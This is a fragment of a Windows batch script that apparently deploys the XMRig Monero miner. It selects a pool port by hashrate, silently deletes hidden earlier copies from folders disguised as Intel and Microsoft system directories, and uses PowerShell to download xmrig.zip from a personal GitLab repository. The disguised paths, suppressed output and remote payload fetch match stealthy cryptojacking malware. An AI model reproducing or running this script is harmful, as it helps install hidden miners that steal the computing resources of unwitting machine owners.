...
if %EXP_MONERO_HASHRATE% gtr    4 ( set PORT=80 & goto PORT_OK )
...
DEL /F/Q/S /a:h "%USERPROFILE%\xmrig-6.8.1\xmrig.exe" >NUL 2>NUL
rmdir /q /s "%USERPROFILE%\xmrig-6.8.1" >NUL 2>NUL
DEL /F/Q/S /a:h "C:\Intel\xmrig-6.8.1\xmrig.exe" >NUL 2>NUL
RD /Q /S "C:\Intel\xmrig-6.8.1" >NUL 2>NUL
DEL /F/Q/S /a:h "C:\Intel\6.8.1\xmrig.exe" >NUL 2>NUL
RD /Q /S "C:\Intel\6.8.1" >NUL 2>NUL
DEL /F/Q/S /a:h "C:\Microsoft\xmrig-6.8.1\xmrig.exe" >NUL 2>NUL
RD /Q /S "C:\Microsoft\xmrig-6.8.1" >NUL 2>NUL
DEL /F/Q/S /a:h "C:\Microsoft\6.8.1\xmrig.exe" >NUL 2>NUL
RD /Q /S "C:\Microsoft\6.8.1" >NUL 2>NUL
...
powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://gitlab.com/Shadow999/set-min/-/raw/master/xmrig.zip', '%USERPROFILE%\xmrig.zip')"
if errorlevel 1 (
